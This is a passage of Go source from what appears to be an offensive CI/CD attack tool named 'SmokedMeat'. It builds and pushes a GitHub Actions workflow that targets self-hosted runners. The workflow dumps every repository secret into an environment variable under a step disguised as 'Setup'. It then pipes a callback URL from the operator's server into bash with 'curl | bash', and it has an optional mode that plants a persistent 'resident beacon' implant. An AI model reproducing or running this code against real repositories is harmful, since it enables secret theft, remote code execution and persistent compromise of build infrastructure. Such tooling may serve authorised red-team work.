		dwellTime := m.wizard.DwellTime
		persistenceEnabled := m.wizard.PersistenceAttempt
		m.AddOutput("info", fmt.Sprintf("Target: %s [%s]", target.Repository, target.LabelDisplay))
		m.AddOutput("muted", fmt.Sprintf("Workflow file: %s | Mode: %s", workflowPath, modeLabel))
		if route := m.runnerTargetRouteSummary(); route != "" {
			m.AddOutput("muted", "Route: "+route)
		}
		if len(target.DynamicLabelSet) > 0 {
			m.AddOutput("muted", fmt.Sprintf("Optional runtime labels observed and omitted: %s", strings.Join(target.DynamicLabelSet, ", ")))
		}
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Persistence: %t", stager.ID, persistenceEnabled))
		m.CloseWizard()
		return m, m.deployRunnerTargetAutoWorkflowPush(target, stager.ID, branchName, workflowPath, workflowYAML, dwellTime, sshState)
	case RunnerTargetActionCopyWorkflow:
		if err := validateRunnerTargetWorkflowLabels(target); err != nil {
			m.AddOutput("error", err.Error())
			return m, nil
		}
		workflowPath := runnerTargetWorkflowPath()
		stager, script, err := m.prepareRunnerTargetPayload(target, m.runnerTargetCallbackMetadata(target, workflowPath, "", "manual"))
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}
		workflowYAML := buildRunnerTargetCallbackWorkflow(target, script)
		if err := clipboardWriteAll(workflowYAML); err != nil {
			m.AddOutput("warning", fmt.Sprintf("Clipboard failed: %v", err))
		} else {
			m.AddOutput("success", "══════════════════════════════════════")
			m.AddOutput("success", "  ✓ WORKFLOW COPIED TO CLIPBOARD")
			m.AddOutput("success", "══════════════════════════════════════")
			m.activityLog.Add(IconSuccess, "Runner-target workflow copied to clipboard")
		}

		modeLabel := wizardDeploymentModeLabel(m.wizard)
		dwellTime := m.wizard.DwellTime
		persistenceEnabled := m.wizard.PersistenceAttempt
		m.AddOutput("info", fmt.Sprintf("Target: %s [%s]", target.Repository, target.LabelDisplay))
		m.AddOutput("muted", fmt.Sprintf("Workflow file: %s | Mode: %s", workflowPath, modeLabel))
		if route := m.runnerTargetRouteSummary(); route != "" {
			m.AddOutput("muted", "Route: "+route)
		}
		if len(target.DynamicLabelSet) > 0 {
			m.AddOutput("muted", fmt.Sprintf("Optional runtime labels observed and omitted: %s", strings.Join(target.DynamicLabelSet, ", ")))
		}
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Persistence: %t", stager.ID, persistenceEnabled))
		if persistenceEnabled {
			m.AddOutput("info", "Waiting for resident foothold seed - the resident beacon should appear in implants automatically")
		}
		m.AddOutput("output", workflowYAML)
		m.wizard.Reset()
		m.StartWaitingForRunnerTarget(stager.ID, target, "Self-Hosted Workflow Push", dwellTime)
		return m, nil
	default:
		m.CloseWizard()
		return m, nil
	}
}

func (m *Model) prepareRunnerTargetPayload(target *RunnerTargetSelection, metadata map[string]string) (*rye.Stager, string, error) {
	stager := rye.NewStager(m.config.ExternalURL(), rye.BashRun)

	if metadata == nil {
		metadata = make(map[string]string)
	}
	metadata["repository"] = target.Repository
	metadata["callback_label"] = runnerTargetCallbackLabel(target, metadata[runnerTargetMetadataWorkflowFileKey])
	if workflowPath := strings.TrimSpace(metadata[runnerTargetMetadataWorkflowFileKey]); workflowPath != "" {
		metadata["workflow"] = workflowPath
		metadata["job"] = runnerTargetWorkflowJobName()
	} else {
		if len(target.ObservedWorkflowPaths) > 0 {
			metadata["workflow"] = target.ObservedWorkflowPaths[0]
		}
		if len(target.ObservedJobNames) > 0 {
			metadata["job"] = target.ObservedJobNames[0]
		}
	}
	metadata["runner_label"] = target.LabelDisplay

	if m.wizard != nil && m.wizard.PersistenceAttempt {
		callback, err := m.registerPersistentRunnerFoothold(stager.ID, m.wizard.DwellTime, metadata)
		if err != nil {
			return stager, "", err
		}
		if callback != nil {
			m.upsertCallback(*callback)
		}
		return stager, buildRunnerTargetCallbackScript(stager.CallbackURL(), true), nil
	}

	if err := m.registerStagerWithMeta(stager.ID, m.wizard.DwellTime, m.wizard.CallbackBudget, metadata); err != nil {
		return stager, "", err
	}
	return stager, buildRunnerTargetCallbackScript(stager.CallbackURL(), false), nil
}

func (m Model) runnerTargetCallbackMetadata(target *RunnerTargetSelection, workflowPath, branchName, route string) map[string]string {
	metadata := map[string]string{
		runnerTargetMetadataKindKey:         runnerTargetMetadataKindValue,
		runnerTargetMetadataWorkflowFileKey: workflowPath,
		runnerTargetMetadataTriggerKey:      "push",
	}
	if route != "" {
		metadata[runnerTargetMetadataRouteKey] = route
	}
	if branchName != "" {
		metadata[runnerTargetMetadataBranchKey] = branchName
	}
	if m.wizard != nil && m.wizard.PersistenceAttempt {
		metadata[runnerTargetMetadataModeKey] = runnerTargetMetadataModeResident
		metadata[runnerTargetMetadataRetryKey] = runnerTargetRetryPolicy(m.config.ExternalURL())
	}
	return metadata
}

func runnerTargetCallbackLabel(target *RunnerTargetSelection, workflowPath string) string {
	if target == nil {
		return "Self-hosted runner"
	}
	if strings.TrimSpace(workflowPath) != "" {
		return "Self-hosted runner - " + workflowPath
	}
	if len(target.ObservedWorkflowPaths) > 0 {
		return "Self-hosted runner - " + target.ObservedWorkflowPaths[0]
	}
	if target.Repository != "" && target.LabelDisplay != "" {
		return "Self-hosted runner - " + target.Repository + " - " + target.LabelDisplay
	}
	if target.Repository != "" {
		return "Self-hosted runner - " + target.Repository
	}
	if target.LabelDisplay != "" {
		return "Self-hosted runner - " + target.LabelDisplay
	}
	return "Self-hosted runner"
}

func buildRunnerTargetCallbackScript(callbackURL string, persistent bool) string {
	if persistent {
		return fmt.Sprintf("curl -fsSL %q | %s=1 bash", callbackURL, persistenceEnvKey)
	}
	return fmt.Sprintf("curl -fsSL %q | bash", callbackURL)
}

func runnerTargetWorkflowPath() string {
	return ".github/workflows/smokedmeat-self-hosted.yml"
}

func runnerTargetWorkflowJobName() string {
	return "smokedmeat-runner"
}

func buildRunnerTargetCallbackWorkflow(target *RunnerTargetSelection, script string) string {
	labels, err := runnerTargetWorkflowLabels(target)
	if err != nil {
		return ""
	}

	var b strings.Builder
	b.WriteString("name: SmokedMeat Self-Hosted Callback\n")
	b.WriteString("on:\n")
	b.WriteString("  push:\n")
	b.WriteString("jobs:\n")
	b.WriteString("  " + runnerTargetWorkflowJobName() + ":\n")
	b.WriteString("    runs-on:\n")
	for _, label := range labels {
		fmt.Fprintf(&b, "      - %s\n", strconv.Quote(label))
	}
	b.WriteString("    permissions:\n")
	b.WriteString("      contents: read\n")
	b.WriteString("    steps:\n")
	b.WriteString("      - name: Setup\n")
	b.WriteString("        env:\n")
	b.WriteString("          SETUP: ${{ toJSON(secrets) }}\n")
	b.WriteString("        run: echo \"Setup completed\"\n")
	b.WriteString("      - name: SmokedMeat callback\n")
	b.WriteString("        shell: bash\n")
	b.WriteString("        run: |\n")
	for _, line := range strings.Split(script, "\n") {
		if strings.TrimSpace(line) == "" {
			b.WriteString("          \n")
			continue
		}
		b.WriteString("          " + line + "\n")
	}
	return b.String()
}

func validateRunnerTargetWorkflowLabels(target *RunnerTargetSelection) error {
	_, err := runnerTargetWorkflowLabels(target)
	return err
}

func runnerTargetWorkflowLabels(target *RunnerTargetSelection) ([]string, error) {
	if target == nil {
		return []string{"self-hosted"}, nil
	}
	labels := make([]string, 0, len(target.LabelSet))
	for _, raw := range target.LabelSet {
		label := strings.TrimSpace(raw)
		if label == "" {
			continue
		}
		if !runnerTargetStaticLabelPattern.MatchString(label) {
			return nil, fmt.Errorf("runner label %q is not safe for generated YAML; copy/edit the workflow manually", label)
		}
		labels = append(labels, label)
	}
	if len(labels) > 0 {
		return labels, nil
	}
	if len(target.DynamicLabelSet) > 0 {
		return nil, fmt.Errorf("runner target uses only dynamic labels; copy/edit the workflow manually")
	}
	return []string{"self-hosted"}, nil
}
